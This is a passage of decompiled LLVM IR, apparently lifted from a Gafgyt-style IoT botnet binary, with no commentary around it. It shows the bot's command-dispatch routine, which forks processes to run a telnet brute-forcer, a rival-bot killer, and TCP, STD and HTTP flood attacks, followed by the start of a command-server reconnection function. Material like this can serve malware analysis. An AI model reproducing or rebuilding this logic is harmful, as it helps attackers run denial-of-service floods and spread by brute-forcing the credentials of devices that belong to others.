  %v2_10b1c = icmp eq i32 %v4_10b14, 0
  br i1 %v2_10b1c, label %dec_label_pc_10b24, label %dec_label_pc_10b88

dec_label_pc_10b24:                               ; preds = %dec_label_pc_10b00
  %v2_10b28 = load i32, i32* @global_var_2fb90.938, align 4
  %v2_10b2c = icmp eq i32 %v2_10b28, 0
  br i1 %v2_10b2c, label %dec_label_pc_10b34, label %dec_label_pc_11314

dec_label_pc_10b34:                               ; preds = %dec_label_pc_10b24
  %v0_10b34 = call i32 @__libc_fork()
  %v2_10b44 = icmp eq i32 %v0_10b34, 0
  br i1 %v2_10b44, label %dec_label_pc_10b68, label %dec_label_pc_10b4c

dec_label_pc_10b4c:                               ; preds = %dec_label_pc_10b34
  store i32 %v0_10b34, i32* @global_var_2fb90.938, align 4
  br label %dec_label_pc_11314

dec_label_pc_10b68:                               ; preds = %dec_label_pc_10b34
  %v2_10b6c = load i32, i32* @global_var_29910.71, align 4
  %v3_10b78 = call i32 @sockprintf(i32 %v2_10b6c, i32 ptrtoint ([12 x i8]* @global_var_1f7a4.944 to i32))
  %v1_10b7c = call i32 @Da_Telnet_Bruter(i32 %v3_10b78)
  %v1_10b84 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10b88:                               ; preds = %dec_label_pc_10b00, %dec_label_pc_10a54
  %v2_10b8c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1f7b0.946 to i32), i32* @r1, align 4
  %v3_10b98 = inttoptr i32 %v2_10b8c to i8*
  %v4_10b98 = call i32 @__GI_strcoll(i8* %v3_10b98, i32 ptrtoint ([8 x i8]* @global_var_1f7b0.946 to i32))
  %v2_10ba0 = icmp eq i32 %v4_10b98, 0
  br i1 %v2_10ba0, label %dec_label_pc_10ba8, label %dec_label_pc_10bec

dec_label_pc_10ba8:                               ; preds = %dec_label_pc_10b88
  %v0_10ba8 = call i32 @listFork()
  %v2_10bb0 = icmp eq i32 %v0_10ba8, 0
  br i1 %v2_10bb0, label %dec_label_pc_10bb8, label %dec_label_pc_10bec

dec_label_pc_10bb8:                               ; preds = %dec_label_pc_10ba8
  %v2_10bbc = load i32, i32* @global_var_29910.71, align 4
  store i32 %v2_10bbc, i32* @r4, align 4
  %v2_10bc4 = load i32, i32* @global_var_2fb88.587, align 4
  store i32 %v2_10bc4, i32* @r0, align 4
  %v1_10bc8 = call i32 @__GI_inet_ntoa(i32 %v2_10bc4)
  %v0_10bd0 = load i32, i32* @r4, align 4
  store i32 %v1_10bc8, i32* @r2, align 4
  %v3_10bdc = call i32 @sockprintf(i32 %v0_10bd0, i32 ptrtoint ([13 x i8]* @global_var_1f7b8.949 to i32))
  %v1_10be0 = call i32 @botkiller(i32 %v3_10bdc)
  %v1_10be8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10bec:                               ; preds = %dec_label_pc_10ba8, %dec_label_pc_10b88
  %v2_10bf0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1f7c8.951 to i32), i32* @r1, align 4
  %v3_10bfc = inttoptr i32 %v2_10bf0 to i8*
  %v4_10bfc = call i32 @__GI_strcoll(i8* %v3_10bfc, i32 ptrtoint ([4 x i8]* @global_var_1f7c8.951 to i32))
  %v2_10c04 = icmp eq i32 %v4_10bfc, 0
  br i1 %v2_10c04, label %dec_label_pc_10c0c, label %dec_label_pc_10e68

dec_label_pc_10c0c:                               ; preds = %dec_label_pc_10bec
  %v7_10c14 = icmp slt i32 %arg1, 6
  br i1 %v7_10c14, label %dec_label_pc_11314, label %dec_label_pc_10c18

dec_label_pc_10c18:                               ; preds = %dec_label_pc_10c0c
  %v1_10c1c = add i32 %tmp, 12
  %v1_10c20 = inttoptr i32 %v1_10c1c to i32*
  %v2_10c20 = load i32, i32* %v1_10c20, align 4
  store i32 %v2_10c20, i32* @r0, align 4
  %v1_10c28 = call i32 @atol(i32 %v2_10c20)
  %v7_10c30 = icmp eq i32 %v1_10c28, -1
  br i1 %v7_10c30, label %dec_label_pc_11314, label %dec_label_pc_10c38

dec_label_pc_10c38:                               ; preds = %dec_label_pc_10c18
  %v1_10c3c = add i32 %tmp, 8
  %v1_10c40 = inttoptr i32 %v1_10c3c to i32*
  %v2_10c40 = load i32, i32* %v1_10c40, align 4
  store i32 %v2_10c40, i32* @r0, align 4
  %v1_10c48 = call i32 @atol(i32 %v2_10c40)
  %v7_10c50 = icmp eq i32 %v1_10c48, -1
  br i1 %v7_10c50, label %dec_label_pc_11314, label %dec_label_pc_10c64

dec_label_pc_10c64:                               ; preds = %dec_label_pc_10c38
  %v1_10c68 = add i32 %tmp, 20
  %v1_10c6c = inttoptr i32 %v1_10c68 to i32*
  %v2_10c6c = load i32, i32* %v1_10c6c, align 4
  store i32 %v2_10c6c, i32* @r0, align 4
  %v1_10c74 = call i32 @atol(i32 %v2_10c6c)
  %v1_10c7c = icmp slt i32 %v1_10c74, 0
  br i1 %v1_10c7c, label %dec_label_pc_11314, label %dec_label_pc_10c84

dec_label_pc_10c84:                               ; preds = %dec_label_pc_10c64
  %v7_10c88 = icmp eq i32 %arg1, 7
  br i1 %v7_10c88, label %dec_label_pc_10c90, label %dec_label_pc_10cb4

dec_label_pc_10c90:                               ; preds = %dec_label_pc_10c84
  %v1_10c94 = add i32 %tmp, 24
  %v1_10c98 = inttoptr i32 %v1_10c94 to i32*
  %v2_10c98 = load i32, i32* %v1_10c98, align 4
  store i32 %v2_10c98, i32* @r0, align 4
  %v1_10ca0 = call i32 @atol(i32 %v2_10c98)
  %v5_10cac = icmp sgt i32 %v1_10ca0, 0
  br i1 %v5_10cac, label %dec_label_pc_10cb4, label %dec_label_pc_11314

dec_label_pc_10cb4:                               ; preds = %dec_label_pc_10c84, %dec_label_pc_10c90
  %v1_10cb8 = add i32 %tmp, 4
  %v1_10cbc = inttoptr i32 %v1_10cb8 to i32*
  %v2_10cbc = load i32, i32* %v1_10cbc, align 4
  %v2_10ccc = load i32, i32* %v1_10c40, align 4
  store i32 %v2_10ccc, i32* @r0, align 4
  %v1_10cd4 = call i32 @atol(i32 %v2_10ccc)
  %v2_10ce8 = load i32, i32* %v1_10c20, align 4
  store i32 %v2_10ce8, i32* @r0, align 4
  %v1_10cf0 = call i32 @atol(i32 %v2_10ce8)
  %v1_10d00 = add i32 %tmp, 16
  %v1_10d04 = inttoptr i32 %v1_10d00 to i32*
  %v2_10d04 = load i32, i32* %v1_10d04, align 4
  br i1 %v7_10c88, label %dec_label_pc_10d18, label %dec_label_pc_10d34

dec_label_pc_10d18:                               ; preds = %dec_label_pc_10cb4
  %v1_10d1c = add i32 %tmp, 24
  %v1_10d20 = inttoptr i32 %v1_10d1c to i32*
  %v2_10d20 = load i32, i32* %v1_10d20, align 4
  store i32 %v2_10d20, i32* @r0, align 4
  %v1_10d28 = call i32 @atol(i32 %v2_10d20)
  br label %dec_label_pc_10d74

dec_label_pc_10d34:                               ; preds = %dec_label_pc_10cb4
  br label %dec_label_pc_10d74

dec_label_pc_10d74:                               ; preds = %dec_label_pc_10d18, %dec_label_pc_10d34
  %storemerge5 = phi i32 [ 10, %dec_label_pc_10d34 ], [ %v1_10d28, %dec_label_pc_10d18 ]
  %v2_10d58 = load i32, i32* %v1_10c6c, align 4
  store i32 %v2_10d58, i32* @r0, align 4
  %v1_10d60 = call i32 @atol(i32 %v2_10d58)
  %v2_10d90 = call i32 @__GI_strchr(i32 %v2_10cbc, i32 44)
  %v2_10d98 = icmp eq i32 %v2_10d90, 0
  br i1 %v2_10d98, label %dec_label_pc_10e24, label %dec_label_pc_10da0

dec_label_pc_10da0:                               ; preds = %dec_label_pc_10d74
  store i32 %v2_10cbc, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1f750.914 to i32), i32* @r1, align 4
  %v2_10dac = call i32 @__GI_strtok(i32 %v2_10cbc, i32 ptrtoint (i32* @global_var_1f750.914 to i32))
  %v2_10e1821 = icmp eq i32 %v2_10dac, 0
  br i1 %v2_10e1821, label %dec_label_pc_10e68, label %dec_label_pc_10dbc

dec_label_pc_10dbc:                               ; preds = %dec_label_pc_10da0, %dec_label_pc_10e00
  %storemerge1222 = phi i32 [ %v2_10e08, %dec_label_pc_10e00 ], [ %v2_10dac, %dec_label_pc_10da0 ]
  %v0_10dbc = call i32 @listFork()
  %v2_10dc4 = icmp eq i32 %v0_10dbc, 0
  br i1 %v2_10dc4, label %dec_label_pc_10dcc, label %dec_label_pc_10e00

dec_label_pc_10dcc:                               ; preds = %dec_label_pc_10dbc
  %v7_10df4 = call i32 @SendTCP(i32 %storemerge1222, i32 %v1_10cd4, i32 %v1_10cf0, i32 %v2_10d04, i32 %v1_10d60, i32 %storemerge5, i32 32)
  %v1_10dfc = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10e00:                               ; preds = %dec_label_pc_10dbc
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1f750.914 to i32), i32* @r1, align 4
  %v2_10e08 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1f750.914 to i32))
  %v2_10e18 = icmp eq i32 %v2_10e08, 0
  br i1 %v2_10e18, label %dec_label_pc_10e68, label %dec_label_pc_10dbc

dec_label_pc_10e24:                               ; preds = %dec_label_pc_10d74
  %v0_10e24 = call i32 @listFork()
  %v2_10e2c = icmp eq i32 %v0_10e24, 0
  br i1 %v2_10e2c, label %dec_label_pc_10e34, label %dec_label_pc_11314

dec_label_pc_10e34:                               ; preds = %dec_label_pc_10e24
  %v7_10e5c = call i32 @SendTCP(i32 %v2_10cbc, i32 %v1_10cd4, i32 %v1_10cf0, i32 %v2_10d04, i32 %v1_10d60, i32 %storemerge5, i32 32)
  %v1_10e64 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10e68:                               ; preds = %dec_label_pc_10e00, %dec_label_pc_10da0, %dec_label_pc_10bec
  %v2_10e6c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1f7cc.954 to i32), i32* @r1, align 4
  %v3_10e78 = inttoptr i32 %v2_10e6c to i8*
  %v4_10e78 = call i32 @__GI_strcoll(i8* %v3_10e78, i32 ptrtoint ([4 x i8]* @global_var_1f7cc.954 to i32))
  %v2_10e80 = icmp eq i32 %v4_10e78, 0
  br i1 %v2_10e80, label %dec_label_pc_10e88, label %dec_label_pc_10fcc

dec_label_pc_10e88:                               ; preds = %dec_label_pc_10e68
  %v7_10e90 = icmp slt i32 %arg1, 4
  br i1 %v7_10e90, label %dec_label_pc_11314, label %dec_label_pc_10e94

dec_label_pc_10e94:                               ; preds = %dec_label_pc_10e88
  %v1_10e98 = add i32 %tmp, 8
  %v1_10e9c = inttoptr i32 %v1_10e98 to i32*
  %v2_10e9c = load i32, i32* %v1_10e9c, align 4
  store i32 %v2_10e9c, i32* @r0, align 4
  %v1_10ea4 = call i32 @atol(i32 %v2_10e9c)
  %tmp64 = icmp slt i32 %v1_10ea4, 1
  br i1 %tmp64, label %dec_label_pc_11314, label %dec_label_pc_10eb4

dec_label_pc_10eb4:                               ; preds = %dec_label_pc_10e94
  %v1_10eb8 = add i32 %tmp, 12
  %v1_10ebc = inttoptr i32 %v1_10eb8 to i32*
  %v2_10ebc = load i32, i32* %v1_10ebc, align 4
  store i32 %v2_10ebc, i32* @r0, align 4
  %v1_10ec4 = call i32 @atol(i32 %v2_10ebc)
  %v5_10ed0 = icmp sgt i32 %v1_10ec4, 0
  br i1 %v5_10ed0, label %dec_label_pc_10ed8, label %dec_label_pc_11314

dec_label_pc_10ed8:                               ; preds = %dec_label_pc_10eb4
  %v1_10edc = add i32 %tmp, 4
  %v1_10ee0 = inttoptr i32 %v1_10edc to i32*
  %v2_10ee0 = load i32, i32* %v1_10ee0, align 4
  %v2_10ef0 = load i32, i32* %v1_10e9c, align 4
  store i32 %v2_10ef0, i32* @r0, align 4
  %v1_10ef8 = call i32 @atol(i32 %v2_10ef0)
  %v2_10f0c = load i32, i32* %v1_10ebc, align 4
  store i32 %v2_10f0c, i32* @r0, align 4
  %v1_10f14 = call i32 @atol(i32 %v2_10f0c)
  %v2_10f2c = call i32 @__GI_strchr(i32 %v2_10ee0, i32 44)
  %v2_10f34 = icmp eq i32 %v2_10f2c, 0
  br i1 %v2_10f34, label %dec_label_pc_10fa4, label %dec_label_pc_10f3c

dec_label_pc_10f3c:                               ; preds = %dec_label_pc_10ed8
  store i32 %v2_10ee0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1f750.914 to i32), i32* @r1, align 4
  %v2_10f48 = call i32 @__GI_strtok(i32 %v2_10ee0, i32 ptrtoint (i32* @global_var_1f750.914 to i32))
  %v2_10f9818 = icmp eq i32 %v2_10f48, 0
  br i1 %v2_10f9818, label %dec_label_pc_10fcc, label %dec_label_pc_10f58

dec_label_pc_10f58:                               ; preds = %dec_label_pc_10f3c, %dec_label_pc_10f80
  %storemerge1019 = phi i32 [ %v2_10f88, %dec_label_pc_10f80 ], [ %v2_10f48, %dec_label_pc_10f3c ]
  %v0_10f58 = call i32 @listFork()
  %v2_10f60 = icmp eq i32 %v0_10f58, 0
  br i1 %v2_10f60, label %dec_label_pc_10f68, label %dec_label_pc_10f80

dec_label_pc_10f68:                               ; preds = %dec_label_pc_10f58
  %v4_10f74 = call i32 @SendSTD(i32 %storemerge1019, i32 %v1_10ef8, i32 %v1_10f14, i32 0)
  %v1_10f7c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10f80:                               ; preds = %dec_label_pc_10f58
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1f750.914 to i32), i32* @r1, align 4
  %v2_10f88 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1f750.914 to i32))
  %v2_10f98 = icmp eq i32 %v2_10f88, 0
  br i1 %v2_10f98, label %dec_label_pc_10fcc, label %dec_label_pc_10f58

dec_label_pc_10fa4:                               ; preds = %dec_label_pc_10ed8
  %v0_10fa4 = call i32 @listFork()
  %v2_10fac = icmp eq i32 %v0_10fa4, 0
  br i1 %v2_10fac, label %dec_label_pc_10fb4, label %dec_label_pc_11314

dec_label_pc_10fb4:                               ; preds = %dec_label_pc_10fa4
  %v4_10fc0 = call i32 @SendSTD(i32 %v2_10ee0, i32 %v1_10ef8, i32 %v1_10f14, i32 0)
  %v1_10fc8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_10fcc:                               ; preds = %dec_label_pc_10f80, %dec_label_pc_10f3c, %dec_label_pc_10e68
  %v2_10fd0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1f7d0.956 to i32), i32* @r1, align 4
  %v3_10fdc = inttoptr i32 %v2_10fd0 to i8*
  %v4_10fdc = call i32 @__GI_strcoll(i8* %v3_10fdc, i32 ptrtoint ([4 x i8]* @global_var_1f7d0.956 to i32))
  %v2_10fe4 = icmp eq i32 %v4_10fdc, 0
  br i1 %v2_10fe4, label %dec_label_pc_10fec, label %dec_label_pc_111d4

dec_label_pc_10fec:                               ; preds = %dec_label_pc_10fcc
  %v7_10ff4 = icmp slt i32 %arg1, 6
  br i1 %v7_10ff4, label %dec_label_pc_11314, label %dec_label_pc_10ff8

dec_label_pc_10ff8:                               ; preds = %dec_label_pc_10fec
  %v1_10ffc = add i32 %tmp, 4
  %v1_11000 = inttoptr i32 %v1_10ffc to i32*
  %v2_11000 = load i32, i32* %v1_11000, align 4
  %v2_1100c = call i32 @__GI_strchr(i32 %v2_11000, i32 44)
  %v2_11014 = icmp eq i32 %v2_1100c, 0
  br i1 %v2_11014, label %dec_label_pc_1111c, label %dec_label_pc_1101c

dec_label_pc_1101c:                               ; preds = %dec_label_pc_10ff8
  %v2_11024 = load i32, i32* %v1_11000, align 4
  store i32 %v2_11024, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1f750.914 to i32), i32* @r1, align 4
  %v2_11030 = call i32 @__GI_strtok(i32 %v2_11024, i32 ptrtoint (i32* @global_var_1f750.914 to i32))
  %v2_1111016 = icmp eq i32 %v2_11030, 0
  br i1 %v2_1111016, label %dec_label_pc_111d4, label %dec_label_pc_11040

dec_label_pc_11040:                               ; preds = %dec_label_pc_1101c, %dec_label_pc_110f8
  %v0_11040 = call i32 @listFork()
  %v2_11048 = icmp eq i32 %v0_11040, 0
  br i1 %v2_11048, label %dec_label_pc_11050, label %dec_label_pc_110f8

dec_label_pc_11050:                               ; preds = %dec_label_pc_11040
  %v2_11058 = load i32, i32* %v1_11000, align 4
  store i32 %v2_11058, i32* @r5, align 4
  %v1_11064 = add i32 %tmp, 8
  %v1_11068 = inttoptr i32 %v1_11064 to i32*
  %v2_11068 = load i32, i32* %v1_11068, align 4
  store i32 %v2_11068, i32* @r6, align 4
  %v1_11074 = add i32 %tmp, 12
  %v1_11078 = inttoptr i32 %v1_11074 to i32*
  %v2_11078 = load i32, i32* %v1_11078, align 4
  store i32 %v2_11078, i32* @r0, align 4
  %v1_11080 = call i32 @atol(i32 %v2_11078)
  %v3_1108c = urem i32 %v1_11080, 65536
  store i32 %v3_1108c, i32* @r7, align 4
  %v1_11098 = add i32 %tmp, 16
  %v1_1109c = inttoptr i32 %v1_11098 to i32*
  %v2_1109c = load i32, i32* %v1_1109c, align 4
  store i32 %v2_1109c, i32* @r8, align 4
  %v1_110a8 = add i32 %tmp, 20
  %v1_110ac = inttoptr i32 %v1_110a8 to i32*
  %v2_110ac = load i32, i32* %v1_110ac, align 4
  store i32 %v2_110ac, i32* @r0, align 4
  %v1_110b4 = call i32 @atol(i32 %v2_110ac)
  store i32 %v1_110b4, i32* @r4, align 4
  %v1_110c0 = add i32 %tmp, 24
  %v1_110c4 = inttoptr i32 %v1_110c0 to i32*
  %v2_110c4 = load i32, i32* %v1_110c4, align 4
  store i32 %v2_110c4, i32* @r0, align 4
  %v1_110cc = call i32 @atol(i32 %v2_110c4)
  %v0_110d4 = load i32, i32* @r4, align 4
  %v0_110dc = load i32, i32* @r5, align 4
  %v0_110e0 = load i32, i32* @r6, align 4
  %v0_110e4 = load i32, i32* @r7, align 4
  %v0_110e8 = load i32, i32* @r8, align 4
  %v6_110ec = trunc i32 %v0_110e4 to i8
  %v7_110ec = call i32 @sendHTTP(i32 %v0_110dc, i32 %v0_110e0, i8 %v6_110ec, i32 %v0_110e8, i32 %v0_110d4, i32 %v1_110cc)
  %v1_110f4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_110f8:                               ; preds = %dec_label_pc_11040
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1f750.914 to i32), i32* @r1, align 4
  %v2_11100 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1f750.914 to i32))
  %v2_11110 = icmp eq i32 %v2_11100, 0
  br i1 %v2_11110, label %dec_label_pc_111d4, label %dec_label_pc_11040

dec_label_pc_1111c:                               ; preds = %dec_label_pc_10ff8
  %v0_1111c = call i32 @listFork()
  %v2_11124 = icmp eq i32 %v0_1111c, 0
  br i1 %v2_11124, label %dec_label_pc_1112c, label %dec_label_pc_11314

dec_label_pc_1112c:                               ; preds = %dec_label_pc_1111c
  %v2_11134 = load i32, i32* %v1_11000, align 4
  store i32 %v2_11134, i32* @r5, align 4
  %v1_11140 = add i32 %tmp, 8
  %v1_11144 = inttoptr i32 %v1_11140 to i32*
  %v2_11144 = load i32, i32* %v1_11144, align 4
  store i32 %v2_11144, i32* @r6, align 4
  %v1_11150 = add i32 %tmp, 12
  %v1_11154 = inttoptr i32 %v1_11150 to i32*
  %v2_11154 = load i32, i32* %v1_11154, align 4
  store i32 %v2_11154, i32* @r0, align 4
  %v1_1115c = call i32 @atol(i32 %v2_11154)
  %v3_11168 = urem i32 %v1_1115c, 65536
  store i32 %v3_11168, i32* @r7, align 4
  %v1_11174 = add i32 %tmp, 16
  %v1_11178 = inttoptr i32 %v1_11174 to i32*
  %v2_11178 = load i32, i32* %v1_11178, align 4
  store i32 %v2_11178, i32* @r8, align 4
  %v1_11184 = add i32 %tmp, 20
  %v1_11188 = inttoptr i32 %v1_11184 to i32*
  %v2_11188 = load i32, i32* %v1_11188, align 4
  store i32 %v2_11188, i32* @r0, align 4
  %v1_11190 = call i32 @atol(i32 %v2_11188)
  store i32 %v1_11190, i32* @r4, align 4
  %v1_1119c = add i32 %tmp, 24
  %v1_111a0 = inttoptr i32 %v1_1119c to i32*
  %v2_111a0 = load i32, i32* %v1_111a0, align 4
  store i32 %v2_111a0, i32* @r0, align 4
  %v1_111a8 = call i32 @atol(i32 %v2_111a0)
  %v0_111b0 = load i32, i32* @r4, align 4
  %v0_111b8 = load i32, i32* @r5, align 4
  %v0_111bc = load i32, i32* @r6, align 4
  %v0_111c0 = load i32, i32* @r7, align 4
  %v0_111c4 = load i32, i32* @r8, align 4
  %v6_111c8 = trunc i32 %v0_111c0 to i8
  %v7_111c8 = call i32 @sendHTTP(i32 %v0_111b8, i32 %v0_111bc, i8 %v6_111c8, i32 %v0_111c4, i32 %v0_111b0, i32 %v1_111a8)
  %v1_111d0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_111d4:                               ; preds = %dec_label_pc_110f8, %dec_label_pc_1101c, %dec_label_pc_10fcc
  %v2_111d8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1f7d4.958 to i32), i32* @r1, align 4
  %v3_111e4 = inttoptr i32 %v2_111d8 to i8*
  %v4_111e4 = call i32 @__GI_strcoll(i8* %v3_111e4, i32 ptrtoint ([9 x i8]* @global_var_1f7d4.958 to i32))
  %v2_111ec = icmp eq i32 %v4_111e4, 0
  br i1 %v2_111ec, label %dec_label_pc_111f4, label %dec_label_pc_112ec

dec_label_pc_111f4:                               ; preds = %dec_label_pc_111d4
  br label %dec_label_pc_11298

dec_label_pc_11208:                               ; preds = %dec_label_pc_11298, %dec_label_pc_112cc
  %v3_1120c = mul i32 %storemerge6, 4
  %v2_11218 = load i32, i32* @global_var_2fb94.80, align 4
  %v2_1121c = add i32 %v2_11218, %v3_1120c
  %v1_11220 = inttoptr i32 %v2_1121c to i32*
  %v2_11220 = load i32, i32* %v1_11220, align 4
  %v2_11224 = icmp eq i32 %v2_11220, 0
  br i1 %v2_11224, label %dec_label_pc_1128c, label %dec_label_pc_1122c

dec_label_pc_1122c:                               ; preds = %dec_label_pc_11208
  %v2_11244 = load i32, i32* %v1_11220, align 4
  store i32 %v2_11244, i32* @r4, align 4
  %v0_11248 = call i32 @__libc_getpid()
  %v0_11250 = load i32, i32* @r4, align 4
  %v9_11250 = icmp eq i32 %v0_11250, %v0_11248
  br i1 %v9_11250, label %dec_label_pc_1128c, label %dec_label_pc_11258

dec_label_pc_11258:                               ; preds = %dec_label_pc_1122c
  %v0_1127c = call i32 @kill()
  %v1_11284 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_1128c

dec_label_pc_1128c:                               ; preds = %dec_label_pc_1122c, %dec_label_pc_11208, %dec_label_pc_11258
  %stack_var_-44.0 = phi i32 [ %stack_var_-44.1, %dec_label_pc_11208 ], [ %stack_var_-44.1, %dec_label_pc_1122c ], [ %v1_11284, %dec_label_pc_11258 ]
  %v1_11290 = add i32 %storemerge6, 1
  br label %dec_label_pc_11298

dec_label_pc_11298:                               ; preds = %dec_label_pc_111f4, %dec_label_pc_1128c
  %stack_var_-44.1 = phi i32 [ 0, %dec_label_pc_111f4 ], [ %stack_var_-44.0, %dec_label_pc_1128c ]
  %storemerge6 = phi i32 [ 0, %dec_label_pc_111f4 ], [ %v1_11290, %dec_label_pc_1128c ]
  %v5_112b0 = load i32, i32* @global_var_29918.78, align 4
  %v9_112c4 = icmp eq i32 %v5_112b0, 0
  br i1 %v9_112c4, label %dec_label_pc_112cc, label %dec_label_pc_11208

dec_label_pc_112cc:                               ; preds = %dec_label_pc_11298
  %v2_112b0 = load i32, i32* @global_var_29914.77, align 4
  %tmp69 = icmp ugt i32 %v2_112b0, %storemerge6
  br i1 %tmp69, label %dec_label_pc_11208, label %dec_label_pc_112ec

dec_label_pc_112ec:                               ; preds = %dec_label_pc_112cc, %dec_label_pc_111d4
  %v2_112f0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([15 x i8]* @global_var_1f7e0.962 to i32), i32* @r1, align 4
  %v3_112fc = inttoptr i32 %v2_112f0 to i8*
  %v4_112fc = call i32 @__GI_strcoll(i8* %v3_112fc, i32 ptrtoint ([15 x i8]* @global_var_1f7e0.962 to i32))
  %v2_11304 = icmp eq i32 %v4_112fc, 0
  br i1 %v2_11304, label %dec_label_pc_1130c, label %dec_label_pc_11314

dec_label_pc_1130c:                               ; preds = %dec_label_pc_112ec
  %v1_11310 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11314

dec_label_pc_11314:                               ; preds = %dec_label_pc_10eb4, %dec_label_pc_10c90, %dec_label_pc_10e24, %dec_label_pc_10fa4, %dec_label_pc_1111c, %dec_label_pc_112ec, %dec_label_pc_10b24, %dec_label_pc_10fec, %dec_label_pc_10e94, %dec_label_pc_10e88, %dec_label_pc_10c64, %dec_label_pc_10c38, %dec_label_pc_10c18, %dec_label_pc_10c0c, %dec_label_pc_10abc, %dec_label_pc_10b4c, %dec_label_pc_10a80, %dec_label_pc_10a3c, %dec_label_pc_1130c
  %v24_11318 = phi i32 [ %v1_10ec4, %dec_label_pc_10eb4 ], [ %v1_10ca0, %dec_label_pc_10c90 ], [ %v0_10e24, %dec_label_pc_10e24 ], [ %v0_10fa4, %dec_label_pc_10fa4 ], [ %v0_1111c, %dec_label_pc_1111c ], [ %v4_112fc, %dec_label_pc_112ec ], [ 0, %dec_label_pc_10b24 ], [ 0, %dec_label_pc_10fec ], [ %v1_10ea4, %dec_label_pc_10e94 ], [ 0, %dec_label_pc_10e88 ], [ %v1_10c74, %dec_label_pc_10c64 ], [ %v1_10c48, %dec_label_pc_10c38 ], [ %v1_10c28, %dec_label_pc_10c18 ], [ 0, %dec_label_pc_10c0c ], [ 0, %dec_label_pc_10abc ], [ %v0_10b34, %dec_label_pc_10b4c ], [ %v3_10a90, %dec_label_pc_10a80 ], [ %v3_10a4c, %dec_label_pc_10a3c ], [ %v1_11310, %dec_label_pc_1130c ]
  store i32 %v3_10a08, i32* @r4, align 4
  store i32 %v6_10a08, i32* @r5, align 4
  store i32 %v9_10a08, i32* @r6, align 4
  store i32 %v12_10a08, i32* @r7, align 4
  store i32 %v15_10a08, i32* @r8, align 4
  store i32 %v18_10a08, i32* @fp, align 4
  ret i32 %v24_11318

; uselistorder directives
  uselistorder i32 %stack_var_-44.1, { 0, 2, 1 }
  uselistorder i32* %v1_11000, { 2, 0, 1, 3 }
  uselistorder i32 %v2_10f88, { 1, 0 }
  uselistorder i32 %v1_10f14, { 1, 0 }
  uselistorder i32 %v1_10ef8, { 1, 0 }
  uselistorder i32 %v2_10ee0, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10e08, { 1, 0 }
  uselistorder i32 %v1_10d60, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v2_10d04, { 1, 0 }
  uselistorder i32 %v1_10cf0, { 1, 0 }
  uselistorder i32 %v1_10cd4, { 1, 0 }
  uselistorder i32 %v2_10cbc, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10c48, { 1, 0 }
  uselistorder i32 %v1_10c28, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 6, 7, 8, 9, 10, 1, 2, 3, 4, 5, 11, 12, 13, 14, 15, 16, 17, 18, 0, 19, 20, 21 }
  uselistorder i32 (i32, i32, i32, i32)* @SendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @SendTCP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1f750.914 to i32), { 2, 8, 3, 9, 1, 10, 4, 11, 0, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32* @global_var_2fb90.938, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1e5d0.73 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_11314, { 18, 5, 4, 7, 3, 0, 8, 9, 2, 1, 10, 11, 12, 13, 15, 6, 14, 16, 17 }
  uselistorder label %dec_label_pc_11298, { 1, 0 }
  uselistorder label %dec_label_pc_1128c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11208, { 1, 0 }
  uselistorder label %dec_label_pc_11040, { 1, 0 }
  uselistorder label %dec_label_pc_10f58, { 1, 0 }
  uselistorder label %dec_label_pc_10dbc, { 1, 0 }
  uselistorder label %dec_label_pc_10d74, { 1, 0 }
  uselistorder label %dec_label_pc_10cb4, { 1, 0 }
  uselistorder label %dec_label_pc_10b00, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4112 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_11374 = load i32, i32* @fp, align 4
  store i32 70524, i32* %stack_var_-4, align 4
  %v2_11378 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11378, i32* @fp, align 4
  %v2_11388 = ptrtoint i32* %stack_var_-4112 to i32
  store i32 4096, i32* @r2, align 4
  %v2_11398 = bitcast i32* %stack_var_-4112 to i8*
  %v3_11398 = call i32 @__GI_memset(i8* %v2_11398, i32 0)
  %v2_113a0 = load i32, i32* @global_var_29910.71, align 4
  %v2_113a4 = icmp eq i32 %v2_113a0, 0
  br i1 %v2_113a4, label %dec_label_pc_113c8, label %dec_label_pc_113ac

dec_label_pc_113ac:                               ; preds = %entry
  %v1_113b8 = call i32 @__libc_close(i32 %v2_113a0)
